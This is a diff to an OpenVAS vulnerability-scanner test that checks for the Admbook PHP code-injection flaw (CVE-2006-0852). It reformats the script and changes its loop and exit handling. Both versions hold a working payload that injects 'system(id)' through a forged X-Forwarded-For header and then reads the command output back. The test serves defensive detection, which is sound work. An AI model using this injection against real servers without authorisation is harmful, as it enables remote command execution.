@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: admbook_cmd_exec.nasl 3854 2016-08-18 13:15:25Z teissa $
+# $Id: admbook_cmd_exec.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: Admbook PHP Code Injection Flaw
 #
 # Authors:
@@ -40,83 +40,58 @@ tag_solution = "Unknown at this time.";
 # Ref: rgod
 # Special thanks to George
 
-if (description) {
-script_id(80048);;
-script_version("$Revision: 3854 $");
-script_tag(name:"last_modification", value:"$Date: 2016-08-18 15:15:25 +0200 (Thu, 18 Aug 2016) $");
-script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
-script_cve_id("CVE-2006-0852");
-script_bugtraq_id(16753);
-script_xref(name:"OSVDB", value:"23365");
-script_tag(name:"cvss_base", value:"7.5");
-script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-name = "Admbook PHP Code Injection Flaw";
-script_name(name);
-
-
-script_category(ACT_DESTRUCTIVE_ATTACK);
+if(description)
+{
+  script_id(80048);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
+  script_cve_id("CVE-2006-0852");
+  script_bugtraq_id(16753);
+  script_xref(name:"OSVDB", value:"23365");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("Admbook PHP Code Injection Flaw");
+  script_category(ACT_DESTRUCTIVE_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
-script_copyright("This script is Copyright (C) 2006 David Maciejak");
+  script_copyright("This script is Copyright (C) 2006 David Maciejak");
+  script_family("Web application abuses");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
-family = "Web application abuses";
-script_family(family);
+  script_tag(name : "solution" , value : tag_solution);
+  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl");
 
-script_dependencies("http_version.nasl");
-script_require_ports("Services/www", 80);
-script_exclude_keys("Settings/disable_cgi_scanning");
-
-script_tag(name : "solution" , value : tag_solution);
-script_tag(name : "summary" , value : tag_summary);
-script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl");
-exit(0);
+  exit(0);
 }
 
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 include("url_func.inc");
 
-
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
+foreach dir( make_list_unique( "/admbook", "/guestbook", "/gb", cgi_dirs( port:port ) ) ) {
 
-# Loop through various directories.
-dirs = make_list("/admbook", "/guestbook", "/gb", cgi_dirs());
+  if( dir == "/" ) dir = "";
 
-foreach dir (dirs)
-{
   cmd = "id";
   magic = rand_str();
 
-  req = http_get(
-    item:string(
-      dir, "/write.php?",
-      "name=openvas&",
-      "email=openvas@", this_host(), "&",
-      "message=", urlencode(str:string("OpenVAS ran ", SCRIPT_NAME, " at ", unixtime()))
-    ),
-    port:port
-  );
-  req = str_replace(
-    string:req,
-    find:"User-Agent:",
-    replace:string(
-      'X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',
-      "User-Agent:"
-    )
-  );
+  req = http_get( item:string( dir, "/write.php?name=openvas&email=openvas@", this_host(), "&message=", urlencode(str:string("OpenVAS ran ", SCRIPT_NAME, " at ", unixtime())) ), port:port );
+  req = str_replace( string:req, find:"User-Agent:", replace:string('X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',"User-Agent:" ));
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   # nb: there won't necessarily be any output from the first request.
 
   req = http_get(item:string(dir, "/content-data.php"), port:port);
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) exit(0);
+  if (res == NULL) continue;
 
-  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
-  {
+  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
     report = string(
       "It was possible to execute the command '", cmd, "' on the remote\n",
       "host, which produces the following output :\n",
@@ -125,5 +100,8 @@ foreach dir (dirs)
     );
 
     security_message(port:port, data:report);
+    exit( 0 );
   }
 }
+
+exit( 99 );
